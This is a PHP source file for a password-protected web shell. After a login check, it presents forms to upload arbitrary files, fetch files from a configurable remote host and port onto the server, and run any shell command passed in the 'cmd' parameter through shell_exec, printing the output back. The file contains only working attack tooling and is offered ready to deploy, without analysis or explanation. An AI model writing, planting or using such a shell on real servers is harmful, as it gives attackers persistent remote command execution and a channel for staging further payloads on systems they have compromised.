<?php
	$_SESSION['valid'] = false;
	login();
	
	function displayForm() {
		if (!$_SESSION['valid']) {
			exit();
		}

		$output = ""; # Leave this blank
		$host = "127.0.0.1"; # host to fetch files from if not a local upload
		$port = "9001"; 

		if (isset($_FILES['fileToUpload'])) {
			$output = "";
			$fileName = basename($_FILES["fileToUpload"]["name"]);
			$file_tmp =$_FILES['fileToUpload']['tmp_name'];
			move_uploaded_file($file_tmp, $fileName);
		}

		if (isset($_POST['remoteFile'])) {
			$output = "";
      file_put_contents($_POST['remoteFile'], file_get_contents("http://$host:$port/" . $_POST['remoteFile']));
    }
    if (isset($_GET['cmd'])) {
      $output .= "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
		}
		
		echo <<<HTML
			<html>
				<body>
					<form action="" method="POST" enctype="multipart/form-data">
						<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
						<p> Local Upload: <input type="file" name="fileToUpload">
						<input type="submit" name="upload">
					</form>

					<br>

					<form action="" method="POST" enctype="multipart/form-data">
						<p> Fetch From Remote: <input type="text" name="remoteFile">
						<input type="submit" name="fetch">
					</form>

					<br>

					<form method="GET">
						<p>CMD: <input type="text" name="cmd">
							<input type="submit" value="Exec">
					</form>
						<pre>
							$output
						</pre>
			</body>
		</html>
HTML;
	}

	function login() {
		$output = "";
		# Ensure these credentials are set
		$masterUser = "";
		$masterPassword = "";
		
		# Exit if master creds are not set
		if ($masterUser === "" or $masterPassword === "") {
			$output .= "<pre>"  . "Master credentials cannot be blank. Edit source" . "</pre>";
			exit();
		}

		if (isset($_POST['username']) and isset($_POST['password'])) {
			if ($_POST['username'] === $masterUser and $_POST['password'] === $masterPassword) {
				$_SESSION['valid'] = true;
        $_SESSION['timeout'] = time();
				displayForm();
			} else {
				$output .= "<pre>"  . "Invalid credentials" . "</pre>";
			}
		} else {
			$output .= "<pre>"  . "Username and password required" . "</pre>";
		}
		echo <<<HTML
		<html>
				<body>
				<form method="POST">
					 <input type="text" title="username" placeholder="username" name="username"/>
					 <input type="password" title="username" placeholder="password" name="password"/>
					 <button type="submit" class="btn">Login</button>
				</form>
					<pre>
						$output
					</pre>
			 	</body>
	 </html>
HTML;
	}
	
	function logout() {
		return 0;
	}

?>
